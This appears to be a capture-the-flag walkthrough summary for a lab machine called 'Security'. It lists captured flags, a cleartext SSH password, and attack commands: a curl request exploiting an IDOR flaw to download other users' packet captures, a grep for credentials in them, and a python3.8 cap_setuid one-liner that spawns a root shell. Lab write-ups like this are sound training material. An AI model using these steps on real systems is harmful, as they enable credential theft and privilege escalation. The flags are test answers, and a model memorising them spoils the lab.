# Security (10.129.32.156) - Quick Reference

## Flags
- **User**: `4926d56b6aa57345c6acedb703b85521`
- **Root**: `3fbfeb016106a14105150774e3b43a66`

## Credentials
- `nathan:Buck3tH4TF0RM3!` (SSH/FTP)

## Vulnerabilities
1. **IDOR** - `/download/<id>` allows access to other users' PCAPs
2. **Linux Capabilities** - `python3.8` has `cap_setuid` for privesc

## Exploitation Commands

### IDOR - Download PCAP
```bash
curl http://TARGET/download/0 -o capture.pcap
strings capture.pcap | grep -iE "USER|PASS"
```

### SSH Access
```bash
ssh nathan@TARGET
# Password: Buck3tH4TF0RM3!
```

### Privesc via cap_setuid
```bash
# Check capabilities
getcap -r / 2>/dev/null

# Exploit python3.8 with cap_setuid
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Key Learnings
- IDOR can expose historical sensitive data
- PCAP files may contain cleartext credentials
- `cap_setuid` on interpreters = instant root
- Always check `getcap` after initial access

## Report Location
`/home/raquel/.openclaw/workspace/reports/10.129.32.156/security-report.md`
